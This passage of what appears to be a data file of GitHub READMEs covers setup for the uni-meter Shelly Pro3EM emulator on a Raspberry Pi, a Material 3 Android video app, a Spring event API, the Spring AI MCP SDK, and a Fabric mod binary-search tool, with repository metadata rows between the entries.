Afterward you will find a `uni-meter-<version>.tgz` archive in the `target` 
directory which can be used to deploy the tool to the target system which most likely is a Raspberry Pi.

## Installation

To install the tool on a Raspberry Pi, you need to have a Java 17 runtime installed. To check if this is the case, type

```shell
java -version
```

If the output shows a version 17 or later, you are good to go. If not, you can install the OpenJDK 17 using the following
commands:

```shell    
sudo apt update
sudo apt install openjdk-17-jre
```

Afterward, you can copy the `uni-meter-<version>.tgz` archive to the Raspberry Pi. In theory, you can extract the archive
to any location you like, but all the scripts and configuration files included assume an installation in the `/opt` 
directory. So preferably you should extract it to the `/opt` directory using the following commands:

```shell
sudo tar xzvf uni-meter-<version>.tgz -C /opt
```
```shell
sudo ln -s /opt/uni-meter-<version> /opt/uni-meter
```

## Announcing the tool via mDNS

To make the tool discoverable by the Hoymiles storage via mDNS, the `avahi-daemon` is used. On recent Raspbian versions,
the `avahi-daemon` is already installed and running. To check if this is the case, type

```shell
sudo systemctl status avahi-daemon
```

If you see an output like `active (running)`, you are good to go. If not, you can install the `avahi-daemon` using the

```shell
sudo apt install avahi-daemon
```

and enable it using the following command:

```shell
sudo systemctl enable avahi-daemon
sudo systemctl start avahi-daemon
```

Afterward you can copy the provided service files to the `/etc/avahi/services` directory.

```shell
sudo cp /opt/uni-meter/config/avahi/*.service /etc/avahi/services/
```

The daemon will automatically pick up the new service files and announce the tool via mDNS. No restart of the 
`avahi-daemon` is needed.

The provided service files announce the Shelly Pro3EM emulator running on port 80. Even if I used another port within the
service file, the Hoymiles storage does not seem to evaluate the port information and still connects to port 80. Maybe
future Hoymiles firmware version also will honor the port information.

In the meantime this has the disadvantage that the `uni-meter` tool has to bind to port 80 which requires root privileges.
Using `nginx` or using `setcap` to run the tool as a non-root user is possible but not covered in this documentation. 

## Configuration

The configuration is done using a configuration file in the [HOCON format](https://github.com/lightbend/config/blob/main/HOCON.md). 

The provided start script assumes the configuration file to be located in the `/etc` directory. To do so, copy the
provided configuration file to that location using:

```shell
sudo cp /opt/uni-meter/config/uni-meter.conf /etc/uni-meter.conf
```

Then use your favorite editor to adjust the configuration file to your needs as described in the following sections.

## Configuring the output device

### Configuring the Shelly device id

It seems as if the Hoymiles storage expects a global unique identifier for the Shelly device. This Shelly device id
is freely configurable and can be set in the `/etc/uni-meter.conf` file. Please configure the mac address and the hostname
of your virtual Shelly Pro3EM device. The mac address should be an arbitrary 12 character long hexadecimal string. 
The hostname should end with the mac address in lower case.

```hocon
uni-meter {
  # ...
  output-devices {
    shelly-pro3em {
      device {
        mac = ""B827EB364242""
        hostname = ""shellypro3em-b827eb364242""
      }
    }
  }
  #...
}
```

Additionally, you have to modify the two service files you copied into the `/etc/avahi/services` directory, so that the correct
device name is announced. Please replace the shellypro3em-b827eb364242 hostname with the one you have configured in the
`uni-meter.conf` file. Each service file contains the hostname twice. Once in the \<name> tag and once in the \<txt-record> tag.

```xml
<?xml version=""1.0"" standalone='no'?>
<!DOCTYPE service-group SYSTEM ""avahi-service.dtd"">
<service-group>
    <name replace-wildcards=""yes"">shellypro3em-b827eb364242</name>
    <service protocol=""ipv4"">
        <type>_http._tcp</type>
        <port>80</port>
        <txt-record>gen=2</txt-record>
        <txt-record>id=shellypro3em-b827eb364242</txt-record>
        <txt-record>arch=esp8266</txt-record>
        <txt-record>fw_id=20241011-114455/1.4.4-g6d2a586</txt-record>
    </service>
</service-group>
```

### Enabling JSON RPC over UDP

As a default the JSON RPC over UDP interface of the Shelly Pro3EM emulator is disabled. To enable it, configure the 
`udp-port` and optionally the `udp-interface` in the `/etc/uni-meter.conf` file:

```hocon
uni-meter {
  # ...
  output-devices {
    shelly-pro3em {
      #...
      udp-port = 1010
      udp-interface = ""0.0.0.0"" # default, can be omitted
      #...
    }
  }
  #...
}
```  

### Throttling the sampling frequency of the Shelly device

In some setups with a higher latency until the real electrical meter readings are available on the output side, it might
be necessary to throttle the sampling frequency of the output data. Otherwise, it might be possible that the storage
oversteer the power production and consumption values and that they are fluctuating too much around 0 (see the comments
and findings to this [issue](https://github.com/sdeigm/uni-meter/issues/12)).

To throttle the sampling frequency you can configure a `min-sample-period` in the `/etc/uni-meter.conf` file. This 
configuration value specifies the minimum time until the next output data is delivered to the storage.

```hocon
uni-meter {
  #...
  output-devices {
    shelly-pro3em {
      #...
      min-sample-period = 5000ms
      #...
    }
  }
  #...
}
```

### Configuring a static power offset

In some setups, it might be necessary to add a static offset to the power values. This can be the case if the real
electrical meter readings are not 100% accurate to your household's electrical meter readings.

You can either configure a power offset for the single phases or a total power offset. The phase power offsets take
precedence over the total power offset. If at least one phase power offset is configured, the total power offset is
ignored.

Setting the power offset is done in the `/etc/uni-meter.conf` file:

```hocon
uni-meter {
  #...
  output-devices {
    #...
    shelly-pro3em {
      #...
      power-offset-total =0
      
      power-offset-l1 = 0
      power-offset-l2 = 0
      power-offset-l3 = 0
    }
  }
}
```

## Configuring the input sources

### Using the generic HTTP input source

The generic HTTP input source can be used to gather the electrical meter data from any device providing the data via
an HTTP get request as JSON value. You have to configure the complete URL where the data is gathered from, including
the entire path and query parameters.

The input source can operate in two modes. Either in a `mono-phase` mode, where the power and/or the energy data is
provided as a single value for all three phases, or in a `tri-phase` mode, where the power and/or the energy data is
provided as a separate value for each phase.

The input data is gathered through channels. The following channels exist for the different energy and power phase modes:
* Power `mono-phase`
  * `power-total` - total current power
* Power `tri-phase`
  * `power-l1` - current power phase 1
  * `power-l2` - current power phase 2
  * `power-l3` - current power phase 3
* Energy `mono-phase`
  * `energy-consumption-total` - total energy consumption
  * `energy-production-total` - total energy production
* Energy `tri-phase`
  * `energy-consumption-l1` - energy consumption phase 1
  * `energy-consumption-l2` - energy consumption phase 2
  * `energy-consumption-l3` - energy consumption phase 3
  * `energy-production-l1` - energy production phase 1
  * `energy-production-l2` - energy production phase 2
  * `energy-production-l3` - energy production phase 3

For each channel to be read, you have to configure where the data is gathered from and what type it is. Currently only 
the `json` type is supported, but in the future, other types might be added. 

For channels in JSON format, an additional JSON path has to be provided which specifies which part of the JSON data
contains the actual value.

Additionally, each channel has a `scale` property which can be used to scale the data. The default scale is 1.0 and can
be omitted.

So a `/etc/uni-meter.conf` file reading the data from a VzLogger webserver could look like this:

```hocon    
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""

  input = ""uni-meter.input-devices.generic-http""

  input-devices {
    generic-http {
      url = ""http://vzlogger-server:8088""
      #username = ""username""
      #password = ""password""

      power-phase-mode = ""mono-phase""
      energy-phase-mode = ""mono-phase""

      channels = [{
        type = ""json""
        channel = ""energy-consumption-total""
        json-path = ""$.data[0].tuples[0][1]""
        scale = 0.001
      },{
        type = ""json""
        channel = ""energy-production-total""
        json-path = ""$.data[1].tuples[0][1]""
        scale = 0.001
      },{
        type = ""json""
        channel = ""power-total""
        json-path = ""$.data[2].tuples[0][1]""
      }]
    }
  }
}
```

### Using MQTT as input source

The MQTT input source can operate in two modes. Either in a `mono-phase` mode, where the power and/or the energy data is
provided as a single value for all three phases, or in a `tri-phase` mode, where the power and/or the energy data is
provided as a separate value for each phase. 

The input data is gathered through channels. Each channel has a unique identifier and a topic where the data is gathered
from. The following channels exist for the different energy and power phase modes:
* Power `mono-phase`
    * `power-total` - total current power
* Power `tri-phase`
    * `power-l1` - current power phase 1
    * `power-l2` - current power phase 2
    * `power-l3` - current power phase 3
* Energy `mono-phase`
    * `energy-consumption-total` - total energy consumption 
    * `energy-production-total` - total energy production
* Energy `tri-phase`
    * `energy-consumption-l1` - energy consumption phase 1
    * `energy-consumption-l2` - energy consumption phase 2
    * `energy-consumption-l3` - energy consumption phase 3
    * `energy-production-l1` - energy production phase 1
    * `energy-production-l2` - energy production phase 2
    * `energy-production-l3` - energy production phase 3 

Each channel is linked to a topic where the data is gathered from and has a type which specifies how the data is
stored within the MQTT topic. Currently, two types are supported: `value` and `json`. Use the `value` type for data 
stored as a number string within the topic. Use the `json` type for data stored as JSON within the topic. For
channels in JSON format, an additional JSON path has to be provided which specifies which part of the JSON data
contains the actual value.

Additionally, each channel has a `scale` property which can be used to scale the data. The default scale is 1.0 and can
be omitted.

So a `/etc/uni-meter.conf` file for a MQTT input source could look like this:

```hocon    
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""

  input = ""uni-meter.input-devices.mqtt""

  input-devices {
    mqtt {
      url = ""tcp://127.0.0.1:1883""
      #username = ""username""
      #password = ""password""

      power-phase-mode = ""mono-phase""
      energy-phase-mode = ""mono-phase""

      channels = [{
        type = ""json""
        topic = ""tele/smlreader/SENSOR""
        channel = ""power-total""
        json-path = ""$..power""
        scale = 1.0 # default, can be omitted
      },{
        type = ""json""
        topic = ""tele/smlreader/SENSOR""
        channel = ""energy-consumption-total""
        json-path = ""$..counter_pos""
      },{
        type = ""json""
        topic = ""tele/smlreader/SENSOR""
        channel = ""energy-production-total""
        json-path = ""$..counter_neg""
      }]
    }
  }
}
```

### Using Shelly 3EM as input source

To use a Shelly 3EM as an input source, set up the `/etc/uni-meter.conf` file as follows

```hocon
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""
  
  input = ""uni-meter.input-devices.shelly-3em""

  input-devices {
    shelly-3em {
      url = ""<shelly-3em-url>""
    }
  }
}
```

Replace the `<shelly-3em-url>` placeholder with the actual URL of your Shelly 3EM device.

This input device is currently totally untested, as I have no test device. If you have a Shelly 3EM device, please provide
feedback if it works or not via the GitHub issues.

### Using SHRDZM smartmeter interface as input source

To use a SHRDZM smartmeter interface providing the smart meter readings via UDP, set up the `/etc/uni-meter.conf` file
as follows

```hocon
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""
  
  input = ""uni-meter.input-devices.shrdzm""

  input-devices {
    shrdzm {
      port = 9522
      interface = ""0.0.0.0""
    }
  }
}
```

The above configuration shows the default values for the ShrDzm device which are used, if nothing is provided. If you
want to use a different port or interface, you have to adjust the values accordingly.

### Using SMA energy meter as input source

To use a SMA energy meter or a Sunny Home Manager as an input source, set up the `/etc/uni-meter.conf` file as follows

```hocon
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""
  
  input = ""uni-meter.input-devices.sma-energy-meter""

  input-devices {
    sma-energy-meter {
      port = 9522   
      group = ""239.12.255.254""
      //susy-id = 270  
      //serial-number = 1234567
      network-interfaces =[
        ""eth0""
        ""wlan0""
        // ""192.168.178.222""
      ]
    }
  }
}
```

The above configuration shows the default values which are used, if nothing is provided. If your `port` and `group` are
different, you have to adjust the values accordingly.

If no `susy-id` and `serial-number` are provided, the first detected device will be used. Otherwise, provide the values
of the device you want to use.

The network interfaces to use are provided as a list of strings. Either specify the names or the IP addresses of the 
interfaces you want to use.

### Using SMD120 modbus energy meter as input source

To use a SMD120 modbus energy meter via a Protos PE11 as an input source, set up the `/etc/uni-meter.conf` file as 
follows:

```hocon
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""
  
  input = ""uni-meter.input-devices.smd120""

  input-devices {
    smd120 {
      port = 8899
    }
  }
}
```

### Using Tasmota IR read head as input source

To use a Tasmota IR read head as an input source, set up the `/etc/uni-meter.conf` file as follows:

```hocon
uni-meter {
  uni-meter {
    output = ""uni-meter.output-devices.shelly-pro3em""

    input = ""uni-meter.input-devices.tasmota""

    input-devices {
      tasmota {
        url = ""http://<tasmota-ir-read-head-ip>""
        # username=""""
        # password=""""
        power-json-path = ""$..curr_w""
        power-scale = 1.0 # default, can be omitted
        energy-consumption-json-path = ""$..total_kwh""
        energy-consumption-scale = 1.0 # default, can be omitted
        energy-production-json-path = ""$..export_total_kwh""
        energy-production-scale = 1.0 # default, can be omitted
      }
    }
  }
}
```

Replace the `<tasmota-ir-read-head-ip>` placeholder with the actual IP address of your Tasmota IR read head device.
If you have set a username and password for the device, you have to provide them as well.

Additionally, you have to configure the JSON paths for the power, energy consumption and energy production values to
access the actual values within the JSON data. If you have to scale these values, you can provide a scale factor which
is 1.0 as a default.

### Using Tibber Pulse as input source

The Tibber Pulse local API can be used as an input source. To use this API, the local HTTP server has to be enabled on 
the Pulse bridge. How this can be done is described for instance here 
[marq24/ha-tibber-pulse-local](https://github.com/marq24/ha-tibber-pulse-local).

If this API is enabled on your Tibber bridge, you should set up the `/etc/uni-meter.conf` file as follows

```hocon
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""
  
  input = ""uni-meter.input-devices.tibber-pulse""

  input-devices {
    tibber-pulse {
      url = ""<tibber-device-url>""
      node-id = 1
      user-id = ""admin""
      password = ""<tibber-device-password>""
    }
  }
}
```

Replace the `<tibber-device-url>` and `<tibber-device-password>` placeholders with the actual values from your environment.  
The `node-id` and `user-id` are optional and can be omitted if the default values from above are correct. Otherwise,
adjust the values accordingly.

### Using VzLogger webserver as input source

To use the VzLogger webserver as an input source set up the `/etc/uni-meter.conf` file as follows and replace the
`<vzlogger-host>` and `<vzlogger-port>` placeholders with the actual host and port of your VzLogger webserver.
Additionally provide the channel UUIDs of your system.

```hocon
uni-meter {
  output = ""uni-meter.output-devices.shelly-pro3em""

  input = ""uni-meter.input-devices.vz-logger""

  input-devices {
    vz-logger {
      url = ""http://<vzlogger-host>:<vzlogger-port>""
      energy-consumption-channel = ""5478b110-b577-11ec-873f-179XXXXXXXX""
      energy-production-channel = ""6fda4300-b577-11ec-8636-7348XXXXXXXX""
      power-channel = ""e172f5b5-76cd-42da-abcc-effeXXXXXXXX""
    }
  }
}
```

You will find that information in the VzLogger configuration file. As a
default, the VzLogger is configured in the `/etc/vzlogger.conf` file. Make sure that the VzLogger provides its
readings as Web service and extract the needed information from that file:

```hocon
{
  // ...
    
  // Build-in HTTP server
  ""local"": {
    ""enabled"": true,    // This has to be enabled to provide the readings via HTTP
    ""port"": 8088,       // Port used by the HTTP server
    
    // ... 
  }
  // ...  
    
  ""meters"": [
    {
      // ...
    
      ""channels"": [{
        ""uuid"" : ""5478b110-b577-11ec-873f-179bXXXXXXXX"",  // UUID of the energy consumption channel
        ""middleware"" : ""http://localhost/middleware.php"",
        ""identifier"" : ""1-0:1.8.0"", // 1.8.0 is the energy consumption channel
        ""aggmode"" : ""MAX""
      },{
        ""uuid"" : ""6fda4300-b577-11ec-8636-7348XXXXXXXX"",  // UUID of the energy production channel
        ""middleware"" : ""http://localhost/middleware.php"",
        ""identifier"" : ""1-0:2.8.0"", // 2.8.0 is the energy production channel
        ""aggmode"" : ""MAX""
      },{
        ""uuid"" : ""e172f5b5-76cd-42da-abcc-effef3b895b2"", // UUID of the power channel
        ""middleware"" : ""http://localhost/middleware.php"",
        ""identifier"" : ""1-0:16.7.0"", // 16.7.0 is the power channel
      }]
    }
  ]
}
````

### First test

After you have adjusted the configuration file, you can start the tool using command

```shell
sudo /opt/uni-meter/bin/uni-meter.sh
```

If everything is set up correctly, the tool should start up, and you should see an output like

```shell
24-12-04 07:29:08.006 INFO  uni-meter                - ##################################################################
24-12-04 07:29:08.030 INFO  uni-meter                - # Universal electric meter converter 0.9.0 (2024-12-04 04:58:16) #
24-12-04 07:29:08.031 INFO  uni-meter                - ##################################################################
24-12-04 07:29:08.033 INFO  uni-meter                - initializing actor system
24-12-04 07:29:10.902 INFO  org.apache.pekko.event.slf4j.Slf4jLogger - Slf4jLogger started
24-12-04 07:29:11.707 INFO  uni-meter.controller     - creating Shelly3EM output device
24-12-04 07:29:11.758 INFO  uni-meter.controller     - creating VZLogger input device
24-12-04 07:29:16.254 INFO  uni-meter.http.port-80   - HTTP server is listening on /[0:0:0:0:0:0:0:0]:80
```

Now you should be able to connect your Hoymiles storage to the emulator using the Hoymiles app.

## Automatic start using systemd

To start the tool automatically on boot, you can use the provided systemd service file. To do so, create a symlink 
within the `/etc/systemd/system` directory using the following command:

```shell
sudo ln -s /opt/uni-meter/config/systemd/uni-meter.service /etc/systemd/system/uni-meter.service
```

Afterward, you can enable the service using the following command so that it will be automatically started on boot:

```shell
sudo systemctl enable uni-meter
```

To start and stop the service immediately run

```shell
sudo systemctl start uni-meter
sudo systemctl stop uni-meter
```
The status of the service can be checked using

```shell
sudo systemctl status uni-meter
```

## Troubleshooting

If you start the tool directly from the command line, all error messages will be printed to the console. If you start the
tool using the systemd service, you can check the log messages in `/var/log/uni-meter.log`.

As a default the log level is just set to `INFO`. For debugging purposes you can set the log level to `DEBUG` or even 
`TRACE` within the `/opt/uni-meter/config/logback.xml` file.

```xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<Configuration status=""WARN"">
    <appender name=""STDOUT"" class=""ch.qos.logback.core.ConsoleAppender"">
        <encoder>
            <pattern>%d{yy-MM-dd HH:mm:ss.SSS} %-5level %-24logger - %msg%n</pattern>
        </encoder>
    </appender>

    <root level=""INFO"">
        <appender-ref ref=""STDOUT"" />
    </root>

    <logger name=""uni-meter""  level=""TRACE"" additivity=""false"">
        <appender-ref ref=""STDOUT"" />
    </logger>
</Configuration>
```

A restart is necessary for these changes to take effect.





",0,1,27,Apache-2.0,0,16.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0
project-material/Videos,main,"<p align=""center"">
  <a href=""https://t.me/projectmaterial"">
    <img src=""https://github.com/project-material/fastlane/blob/main/icon-512.png"" height=""72"">
    <h1 align=""center"">Videos</h1>
  </a>
</p>
<p align=""center"">
  <img src=""https://img.shields.io/badge/android-platform?style=for-the-badge&label=platform&labelColor=212026&color=4285F4"">
  <img src=""https://img.shields.io/badge/31%2B-level?style=for-the-badge&logo=android&logoColor=4FAF53&label=API&labelColor=212026&color=E4F6EA"">
</p>

An application designed to elegantly display and organize videos stored locally on your device, featuring a refined and intuitive user interface.

## Features
- Modern Material 3 Design
- Utilizes MediaStore and FFmpeg for swift metadata retrieval
- Ability to rename, share, or delete directly within the app

## Screenshots
| ![Screenshot 1](https://raw.githubusercontent.com/project-material/fastlane/refs/heads/main/screenshot_1.png) | ![Screenshot 2](https://raw.githubusercontent.com/project-material/fastlane/refs/heads/main/screenshot_2.png) | ![Screenshot 3](https://raw.githubusercontent.com/project-material/fastlane/refs/heads/main/screenshot_3.png) |
|---------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| ![Screenshot 4](https://raw.githubusercontent.com/project-material/fastlane/refs/heads/main/screenshot_4.png) | ![Screenshot 5](https://raw.githubusercontent.com/project-material/fastlane/refs/heads/main/screenshot_5.png) | ![Screenshot 6](https://raw.githubusercontent.com/project-material/fastlane/refs/heads/main/screenshot_6.png) |

## License
This project is licensed under the GNU General Public License v3.0. For further details, please refer to the [LICENSE](https://github.com/project-material/Videos/blob/main/LICENSE) file.
",1,0,1,GPL-3.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
horaciomuller/event-api,main,"# Event and Venue Management API

An advanced and scalable API for managing events and venues, built with modern technologies and principles. This project is designed to deliver robust performance, maintainable code, and seamless integration with existing systems.

## Features
- **Event Management**: Create, update, delete, and retrieve events with ease.
- **Venue Management**: Manage venue details, availability, and bookings.
- **Clean Architecture**: Following Clean Architecture principles for better code organization and maintainability.
- **Database Versioning**: Leveraging Flyway for consistent and traceable database migrations.
- **Containerization**: Built with Docker for simplified deployment and scalability.
- **Modern Java**: Developed with Java 17, utilizing the latest language features.

---

## Tech Stack
- **Java 17**: Modern Java features for cleaner and more efficient code.
- **Spring Framework**: Includes Spring Boot for rapid development and Spring Data for database interaction.
- **Docker**: Containerized application for easy deployment.
- **Flyway**: For managing database schema migrations.
- **PostgreSQL**: Reliable and scalable database backend.

---

## Architecture
The project follows the principles of **Clean Architecture**, ensuring:
- **Separation of Concerns**: Dividing the application into clear layers (Domain, Application, Infrastructure, and Presentation).
- **Testability**: High test coverage and easily testable components.
- **Flexibility**: Easy adaptability for new features and integrations.

### Project Structure
```plaintext
src
‚îú‚îÄ‚îÄ main
‚îÇ   ‚îú‚îÄ‚îÄ java
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ com.example.eventmanagement
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ application  # Application logic
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ domain       # Core business rules
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ infrastructure # External integrations and database
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ presentation  # Controllers and REST endpoints
‚îÇ   ‚îî‚îÄ‚îÄ resources
‚îÇ       ‚îú‚îÄ‚îÄ db/migration     # Flyway migrations
‚îÇ       ‚îî‚îÄ‚îÄ application.yml  # Application configuration
‚îî‚îÄ‚îÄ test
    ‚îî‚îÄ‚îÄ java                 # Unit and integration tests
```

---

## Getting Started

### Prerequisites
Ensure you have the following installed:
- [Java 17](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html)
- [Docker](https://www.docker.com/)
- [Maven](https://maven.apache.org/) (optional, if not using Docker)

### Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/horaciomuller/EventClean.git
   cd event-management-api
   ```

2. Start the application with Docker:
   ```bash
   docker-compose up
   ```

3. Access the API documentation (Swagger):
   ```
   http://localhost:8080/swagger-ui/index.html
   ```

---

## API Endpoints

### Events
- **GET /events**: Retrieve a list of events.
- **POST /events**: Create a new event.
- **PUT /events/{id}**: Update an event by ID.
- **DELETE /events/{id}**: Delete an event by ID.

### Venues
- **GET /venues**: Retrieve a list of venues.
- **POST /venues**: Create a new venue.
- **PUT /venues/{id}**: Update a venue by ID.
- **DELETE /venues/{id}**: Delete a venue by ID.

---

## Database Migrations
This project uses **Flyway** for database schema migrations. All migration scripts are located in the `src/main/resources/db/migration` folder. To run migrations manually, use:
```bash
mvn flyway:migrate
```

---

## Testing

### Unit Tests
Run unit tests with:
```bash
mvn test
```

### Integration Tests
Ensure the database is running and execute:
```bash
mvn verify
```

---

## Contributing
Contributions are welcome! Please follow these steps:
1. Fork the repository.
2. Create a feature branch: `git checkout -b feature-name`
3. Commit your changes: `git commit -m 'Add new feature'`
4. Push to the branch: `git push origin feature-name`
5. Submit a pull request.

---

## License
This project is licensed under the [MIT License](LICENSE).

---

## Contact
For questions or feedback, please contact us at [your-email@example.com](mailto:contato@java10x.dev).
",0,0,3,,1,2.0,0.0,1.0,1.0,6.0,0.0,-1.15,0.0
spring-projects-experimental/spring-ai-mcp,main,"# Java & Spring MCP
[![Build Status](https://github.com/spring-projects-experimental/spring-ai-mcp/actions/workflows/continuous-integration.yml/badge.svg)](https://github.com/spring-projects-experimental/spring-ai-mcp/actions/workflows/continuous-integration.yml)

Set of projects that provide Java SDK and Spring Framework integration for the [Model Context Protocol](https://modelcontextprotocol.org/docs/concepts/architecture). 
It enables Java applications to interact with AI models and tools through a standardized interface, supporting both synchronous and asynchronous communication patterns.

## üìö Reference Documentation
For comprehensive guides and API documentation, visit the [Spring AI MCP Reference Documentation](https://docs.spring.io/spring-ai-mcp/reference/overview.html).

<img src=""mcp-docs/src/main/antora/modules/ROOT/images/spring-ai-mcp-clinet-architecture.jpg"" width=""600"">

<img src=""mcp-docs/src/main/antora/modules/ROOT/images/spring-ai-mcp-server-architecture.jpg"" width=""600"">

## Projects

### [MCP Java SDK](https://docs.spring.io/spring-ai-mcp/reference/mcp.html)

Java implementation of the Model Context Protocol specification. It includes:
- Synchronous and asynchronous [MCP Client](https://docs.spring.io/spring-ai-mcp/reference/mcp.html#_mcp_client) and [MCP Server](https://docs.spring.io/spring-ai-mcp/reference/mcp.html#_mcp_server) implementations
- Standard MCP operations support (tool discovery, resource management, prompt handling, structured logging). Support for request and notification handling.
- [Stdio](https://spec.modelcontextprotocol.io/specification/2024-11-05/basic/transports/#stdio) and [SSE](https://spec.modelcontextprotocol.io/specification/2024-11-05/basic/transports/#http-with-sse) transport implementations. 

### MCP Transports

#### Core Transports
- Stdio-based (`StdioClientTransport`, `StdioServerTransport`) for process-based communication
- Java HttpClient-based SSE client (`HttpClientSseClientTransport`) for HTTP streaming
- Servlet-based SSE server (`HttpServletSseServerTransport`) for HTTP SSE Server streaming using traditional Servlet API

#### Optional SSE Transports
- [WebFlux SSE Transport](https://github.com/spring-projects-experimental/spring-ai-mcp/tree/main/mcp-transport/mcp-webflux-sse-transport) - Reactive HTTP streaming with Spring WebFlux (Client & Server)
- [WebMvc SSE Transport](https://github.com/spring-projects-experimental/spring-ai-mcp/tree/main/mcp-transport/mcp-webmvc-sse-transport) - Spring MVC based HTTP SSE transport (Server only). 
You can use the core `HttpClientSseClientTransport` transport as a SSE client.

### [Spring AI MCP](https://docs.spring.io/spring-ai-mcp/reference/spring-mcp.html)

The Spring integration module provides Spring-specific functionality:
- Integration with Spring AI's function calling system
- Spring-friendly abstractions for MCP clients
- Auto-configurations (WIP)


## Installation

Add the following dependencies to your Maven project:

```xml
<!-- Core MCP -->
<dependency>
    <groupId>org.springframework.experimental</groupId>
    <artifactId>mcp</artifactId>
</dependency>

<!-- Optional: WebFlux SSE transport -->
<dependency>
    <groupId>org.springframework.experimental</groupId>
    <artifactId>mcp-webflux-sse-transport</artifactId>
</dependency>

<!-- Optional: WebMVC SSE transport -->
<dependency>
    <groupId>org.springframework.experimental</groupId>
    <artifactId>mcp-webmvc-sse-transport</artifactId>
</dependency>

<!-- Optional: Spring AI integration -->
<dependency>
    <groupId>org.springframework.experimental</groupId>
    <artifactId>spring-ai-mcp</artifactId>
</dependency>
```

This is a milestone release, not available on Maven Central. 
Add this repository to your POM:

```xml
<repositories>
    <repository>
        <id>spring-milestones</id>
        <name>Spring Milestones</name>
        <url>https://repo.spring.io/milestone</url>
        <snapshots>
            <enabled>false</enabled>
        </snapshots>
    </repository>
</repositories>
```

Reffer to the [Dependency Management](https://docs.spring.io/spring-ai-mcp/reference/dependency-management.html) page for more information.

## Example Demos

Explore these MCP examples in the [spring-ai-examples/model-context-protocol](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol) repository:

- [SQLite Simple](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/sqlite/simple) - Demonstrates LLM integration with a database
- [SQLite Chatbot](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/sqlite/chatbot) - Interactive chatbot with SQLite database interaction
- [Filesystem](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/filesystem) - Enables LLM interaction with local filesystem folders and files
- [Brave](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/brave) - Enables natural language interactions with Brave Search, allowing you to perform internet searches.
- [Theme Park API Example](https://github.com/habuma/spring-ai-examples/tree/main/spring-ai-mcp) - Shows how to create an MCP server and client with Spring AI, exposing Theme Park API tools
- [Http SSE Client + WebMvc SSE Server](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/mcp-webmvc-server) - Showcases how to create and use MCP WebMvc servers and HttpClient clients with different capabilities.
- [WebFlux SSE Client + WebFlux SSE Server](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/mcp-webflux-server) - Showcases how to create and use MCP WebFlux servers and clients with different capabilities
- [HttpClient SSE Client + Servlet SSE Server](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/mcp-servlet-server) - Showcases how to create and use MCP Servlet SSE Server and HttpClient SSE Client with different capabilities

## Documentation

- [Java MCP SDK documentation](mcp/README.md)
  - [Reference documentation](docs/ref-index.md)
- [Spring Integration documentation](spring-ai-mcp/README.md)


## Development

- Building from Source

```bash
mvn clean install
```

- Running Tests

```bash
mvn test
```


## Contributing

This is an experimental Spring project. Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Submit a Pull Request

## Team

- Christian Tzolov
- Dariusz Jƒôdrzejczyk

## Links

- [GitHub Repository](https://github.com/spring-projects-experimental/spring-ai-mcp)
- [Issue Tracker](https://github.com/spring-projects-experimental/spring-ai-mcp/issues)
- [CI/CD](https://github.com/spring-projects-experimental/spring-ai-mcp/actions)

## License

This project is licensed under the [Apache License 2.0](LICENSE).
",8,5,6,Apache-2.0,5,33.0,1.0,5.0,1.0,25.0,1.0,-8.2,0.0
skycatminepokie/FabricBinarySearchTool,master,"# Skycat's Binary Search Tool
### Not a mod, don't put it in your mods folder!
This tool helps you binary search through your fabric mod list. This is useful when you think there is one mod that is 
causing problems, but you can't figure out which one from logs. This will NOT work when there's more than one mod 
causing the problem, when you're missing dependencies (including Minecraft or Java), or for non-fabric things.
## How to use
1. Download the application from the [Releases](https://github.com/skycatminepokie/FabricBinarySearchTool/releases/latest) 
page.
2. Double-click it to run it
3. Go to your `mods` folder and copy the path (on Windows with the default launcher it'll look like
`C:\Users\YourName\AppData\Roaming\.minecraft\mods`).
4. Paste that into the program in the ""mods folder"" text box. 
5. Make sure Minecraft is closed, then click start! The tool will disable about half your mods and keep required dependencies enabled too.
6. Check if the problem was there and close Minecraft (it's ok if it crashed).
7. If the **SAME** problem is still there, click ""Failure."" If it's gone, click ""Success.""
8. Go back to #7 until the program reports that it is done.
9. Once you're done, be sure to report the issue to the mod authors.
## What is a binary search?
In this context, a binary search is disabling half of your mods, and checking if the problem still occurs. If it does, 
then you know the problem is in that half of the mods. If it doesn't, the problem is in the other half. Then you do it 
again. Eventually, you're left with one mod, which is the problem.

The thing is, this can be hard. You have to make sure every mod has all its dependencies, and keep track of which ones 
have worked and which ones haven't. That's what this tool is for.
## What can it help with?
A binary search can find when one mod, and only one mod, is causing a problem. It can't find a conflict between two 
mods, tell you what dependencies you're missing, or fix the mod. It's a good tool as a last resort if the logs don't 
give a conclusive answer.
> Need help with reading logs? Try the [Fabric Discord server](https://discord.gg/v6v4pMv) in the #player-support 
> channel.
## What do I do if the tool breaks?
Report it on the [Issues](https://github.com/skycatminepokie/FabricBinarySearchTool/issues) tab. I'll take a look and 
see if it's in-scope to fix. If some of your mods are disabled, you can re-enable them by renaming the files to remove 
the `.disabled` part at the end. Windows will warn you about it - it's safe to ignore. You can also enable them via 
